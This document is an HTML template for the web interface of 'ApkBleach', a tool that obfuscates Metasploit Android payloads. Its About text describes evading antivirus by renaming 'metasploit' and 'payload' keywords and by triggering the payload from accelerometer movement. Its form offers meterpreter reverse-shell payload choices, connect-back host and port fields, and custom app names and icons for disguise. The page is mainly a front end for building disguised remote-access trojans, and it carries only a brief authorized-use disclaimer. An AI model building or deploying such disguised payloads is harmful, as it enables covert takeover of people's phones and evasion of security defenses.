<!DOCTYPE html>
<html lang="en">
  <head>
    <title>ApkBleach</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Obfuscates android payloads and injects icons"
    />
    <meta name="theme-color" content="#444444" />

    <!-- Path to manifest.json -->
    <link
      rel="manifest"
      href="{{ url_for('static', filename='manifest.json') }}"
    />

    <!-- Apple safari PWA meta tag for full screen when added to homepage -->
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta
      name="apple-mobile-web-app-status-bar-style"
      content="black-translucent"
    />

    <!-- Android/Chrome PWA meta tag for full screen when added to homepage -->
    <meta name="mobile-web-app-capable" content="yes" />

    <!-- Bootstrap css -->
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.2/darkly/bootstrap.min.css"
      integrity="sha384-nNK9n28pDUDDgIiIqZ/MiyO3F4/9vsMtReZK39klb/MtkZI3/LtjSjlmyVPS3KdN"
      crossorigin="anonymous"
    />

    <!-- Google font -->
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@1,500&display=swap"
      rel="stylesheet"
    />

    <!-- Our personal custom css rules  -->
    <link
      rel="stylesheet"
      type="text/css"
      href="{{ url_for('static', filename='css/home-styles.css')}}"
    />
  </head>
  <body>
    <header class="mb-2">
      <div class="pos-f-t">
        <div class="collapse" id="navbarToggleExternalContent">
          <div class="bg-dark p-4">
            <div class="card text-center text-muted">
              <div class="card-header">About Us</div>
              <div class="card-body">
                <img
                  src="{{url_for('static', filename='images/goose-crop.png')}}"
                  alt="Goose Logo"
                  class="goose-crop"
                  role="presentation"
                />
                <p>
                  This software was developed specifically to obfuscate android
                  payloads generated by the metasploit-framework in attempts to
                  evade detection. The obfuscation that takes place attempts to
                  evade detection with two main methods. The first method is
                  strictly for screening of the decompiled payload. By default
                  metasploit generates a android application littered with the
                  keywords metasploit and payload. Replacing those keywords with
                  random strings and randomizing file names is good first step
                  in obfuscating the typical metasploit android payload. The
                  next method is to change the way the payload is executed. The
                  default payload generated by metasploit executes on create or
                  simply put as soon as the application is opened. This
                  obfuscation method uses the devices accelerometer activity to
                  launch the payload. So the apkbleach payload will wait for
                  physical movement of the target device before executing the
                  payload. In addition to those obfuscation techniques apkbleach
                  automates the process of changing the metasploit app icon and
                  name.
                </p>
                <h3 class="card-title">Contact us</h3>
                <!-- Message sent alert -->
                <div id="messageSentFlash" class="text-center m-5">
                  <p>Your message has been sent</p>
                </div>
                <form
                  class="needs-validation"
                  id="contactUs"
                  novalidate
                  method="POST"
                >
                  <div class="form-group">
                    <label for="Email1">Return Email Address</label>
                    <input
                      type="email"
                      class="form-control"
                      id="InputEmail1"
                      name="return-email"
                      aria-describedby="emailHelp"
                      placeholder="Enter return email here..."
                      pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                      required
                    />
                    <div id="InputEmail1" class="invalid-feedback">
                      Please provide a valid email address.
                    </div>
                    <small id="emailHelp" class="form-text text-muted"
                      >We'll never share your email with anyone else.</small
                    >
                  </div>
                  <div class="form-group">
                    <label for="emailSubject mt-2">Email Subject</label>
                    <input
                      type="text"
                      class="form-control"
                      id="emailSubject"
                      name="subject"
                      aria-describedby="subjectHelp"
                      placeholder="Enter email subject here..."
                      required
                    />
                    <div id="emailSubject" class="invalid-feedback">
                      Please provide email subject
                    </div>
                  </div>
                  <div class="form-group">
                    <label class="mt-2" for="emailMessage">Message Body</label>
                    <textarea
                      class="form-control mr-sm-2"
                      id="emailMessage"
                      name="message-body"
                      type="email"
                      placeholder="Message here..."
                      aria-label="Search"
                      required
                    ></textarea>
                    <div id="emailMessage" class="invalid-feedback">
                      Message body can not be empty.
                    </div>
                  </div>
                  <button
                    class="btn btn-secondary btn-block my-2 my-sm-0"
                    id="contactUs"
                    name="contact-us"
                    type="submit"
                  >
                    Email us
                  </button>
                </form>
              </div>
            </div>
          </div>
        </div>
        <nav class="navbar navbar-dark bg-dark">
          <button
            class="navbar-toggler"
            type="button"
            data-toggle="collapse"
            data-target="#navbarToggleExternalContent"
            aria-controls="navbarToggleExternalContent"
            aria-expanded="false"
            aria-label="Toggle navigation"
          >
            <span class="navbar-toggler-icon"></span>
          </button>
          <img
            src="{{url_for('static', filename='images/apkbleach.png')}}"
            alt="ApkBleach Logo"
            class="apkbleach-header"
            role="presentation"
          />
        </nav>
      </div>
    </header>
    <div class="container-fluid">
      <div class="card text-center text-muted">
        <div class="card-header">Terms of use</div>
        <div class="card-body">
          <div class="disclaimer-container">
            <img
              src="{{url_for('static', filename='images/bleach.png')}}"
              alt="Bleach Logo"
              class="bleach-crop"
              role="presentation"
            />
            <p class="card-text disclaimer">
              This tools is free and open source for security research and only
              to be used in controlled environments. By using this tool you
              agree to only deploy this tool in environments you have permission
              to do so in. You are responsible for any laws you break.
            </p>
          </div>
        </div>
      </div>
      <div id="followPopUp">
        <div class="card-footer text-center">
          <h5 class="text-muted m-0">Show your support</h5>
        </div>
        <img
          src="{{url_for('static', filename='images/subscribe.png')}}"
          alt="Subscribe Logo"
          class="subscribe-banner mt-2"
          role="presentation"
        />
      </div>

      <form
        class="needs-validation"
        novalidate
        id="generateForm"
        enctype="multipart/form-data"
        method="POST"
      >
        <div class="form-group">
          <label class="control-label" for="payload-name"
            >Application name</label
          >
          <!-- Pattern for payload-name is in generateForm.js -->
          <input
            type="text"
            class="form-control"
            id="payload-name"
            name="output"
            placeholder="App name"
            required
          />
          <small id="payloadNameWarning" class="text-warning"
            >Warning! The app name will be displayed on the devices home screen.
            Suggest: (App name) not (Appname.apk)</small
          >
          <div id="payload-nameFeedback" class="invalid-feedback">
            Please provide a app name.
          </div>
        </div>
        <div class="form-group">
          <label class="control-label" for="payload-select"
            >Select a payload to use</label
          >
          <select
            class="form-control"
            name="payload"
            id="payload-select"
            required
          >
            <option value="">Select a payload...</option>
            <option value="android/meterpreter/reverse_tcp">
              android/meterpreter/reverse_tcp
            </option>
            <option value="android/meterpreter/reverse_http">
              android/meterpreter/reverse_http
            </option>
            <option value="android/meterpreter/reverse_https">
              android/meterpreter/reverse_https
            </option>
            <option value="android/meterpreter_reverse_tcp">
              android/meterpreter_reverse_tcp
            </option>
            <option value="android/meterpreter_reverse_http">
              android/meterpreter_reverse_http
            </option>
            <option value="android/meterpreter_reverse_https">
              android/meterpreter_reverse_https
            </option>
          </select>
          <div id="payload-selectFeedback" class="invalid-feedback">
            Please select a payload.
          </div>
        </div>
        <div class="form-group">
          <div class="row">
            <div class="col">
              <label
                class="control-label text-truncate"
                for="lhost_input"
                class="form-label"
                >Connection address</label
              >
              <input
                id="lhost_input"
                type="text"
                name="lhost"
                class="form-control"
                placeholder="LHOST"
                pattern="^((\*)|((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|((\*\.)?([a-zA-Z0-9-]+\.){0,5}[a-zA-Z0-9-][a-zA-Z0-9-]+\.[a-zA-Z]{2,63}?))$"
                required
              />
              <div id="lhost_inputFeedback" class="invalid-feedback">
                Please provide a valid connect back address.
              </div>
            </div>
            <div class="col">
              <label
                class="control-label text-truncate"
                for="lport_input"
                class="form-label"
                >Connection port</label
              >
              <input
                id="lport_input"
                type="text"
                name="lport"
                class="form-control"
                placeholder="LPORT"
                pattern="^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
                required
              />
              <div id="lport_inputFeedback" class="invalid-feedback">
                Please provide a valid connect back port.
              </div>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label class="control-label" for="sessions">
            <a id="toolTip">
              <span class="" id="toolTipMessage">
                Instead of executing payload when app opens this will execute
                the payload when the device is moved and the accelerometer gets
                triggered. The number selected will determine the amount of
                sessions to spawn.
              </span>
              <i class="fa fa-info-circle fa-md"></i>
            </a>
            Launch payload from accelerometer
          </label>
          <select class="form-control" name="session-count" id="sessions">
            <option value="" selected>
              Select amount of sessions to spawn
            </option>
            <option>1</option>
            <option>2</option>
            <option>3</option>
            <option>4</option>
            <option>5</option>
          </select>
          <small
            id="sessionsHelp"
            class="form-text text-muted text-center optional"
            >*Optional</small
          >
        </div>
        <div class="form-group">
          <label class="control-label" for="iconfile" class="form-label"
            >Icon for App</label
          >
          <input
            class="form-control form-control"
            name="icon-file"
            id="iconfile"
            type="file"
            accept=".png,.jpg,.gif"
          />
          <small id="iconHelp" class="form-text text-muted text-center optional"
            >*Optional</small
          >
        </div>
        <div class="form-group form-check text-center">
          <label
            class="control-label"
            class="edit-permissions-input"
            for="edit-permissions"
          >
            Edit applications permissions?
          </label>
          <input
            type="checkbox"
            name="edit-permissions"
            class="edit-permissions-input"
            id="edit-permissions"
          />
        </div>
        <div class="form-group form-check text-center" id="permissionsForm">
          <label class="edit-permissions-input" for="edit-permissions"
            >Check the permissions you would like to delete</label
          >
          {% for row in permissions|batch(2) %}
          <div class="row">
            {% for col in row %}
            <div
              class="col-6 d-flex justify-content-between align-items-center mt-2"
            >
              <input
                class="form-check-input"
                type="checkbox"
                id="permission-check-box"
                name="permissions"
                value="{{col}}"
                autocomplete="off"
              />
              <span class="badge badge-primary badge-pill text-truncate"
                >{{col}}</span
              >
            </div>
            {% endfor %}
          </div>
          {% endfor %}
        </div>
        <button
          type="submit"
          id="submit-main"
          class="btn btn-lg mt-4 mb-4"
          name="generate-app"
        >
          <span class="fab fa-android" role="presentation"></span>
          Generate
        </button>
      </form>
      <div class="social-buttons text-center">
        <a href="https://github.com/graylagx2/ApkBleach" target="_blank"
          ><i class="fab text-muted fa-github fa-3x mr-2"></i
        ></a>
        <a
          href="https://www.youtube.com/channel/UCX-P0uOzxPwFNZFD3uZmgXQ"
          target="_blank"
          ><i class="fab text-muted fa-youtube fa-3x mr-2"></i
        ></a>
        <a href="https://www.instagram.com/graylag_x2" target="_blank"
          ><i class="fab text-muted fa-instagram fa-3x mr-2"></i
        ></a>
        <a href="https://www.reddit.com/user/graylagx2" target="_blank"
          ><i class="fab text-muted fa-reddit fa-3x mr-2"></i
        ></a>
      </div>
      <!-- Loading animation to show when loading flask data -->
      <div id="loader" class="text-center mt-4">
        <div class="spinner-grow" role="status">
          <span class="sr-only">Loading...</span>
        </div>
      </div>
    </div>

    <!-- Our personal javascript files -->
    <!-- Loader js is in generateForm.js for this page -->
    <script
      type="text/javascript"
      src="{{ url_for('static', filename='js/generateForm.js') }}"
    ></script>
    <script
      type="text/javascript"
      src="{{ url_for('static', filename='js/permissionsSelect.js') }}"
    ></script>
    <script
      type="text/javascript"
      src="{{ url_for('static', filename='js/toolTip.js') }}"
    ></script>

    <!-- Font awesome icon js kit -->
    <script src="https://kit.fontawesome.com/a076d05399.js"></script>

    <!-- Bootstrap JS and jQuery -->
    <script
      src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"
    ></script>

    <!-- https://cdnjs.cloudflare.com/ajax/libs/jquery.bootstrapvalidator/0.5.3/js/bootstrapValidator.js -->
    <script
      src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
      integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
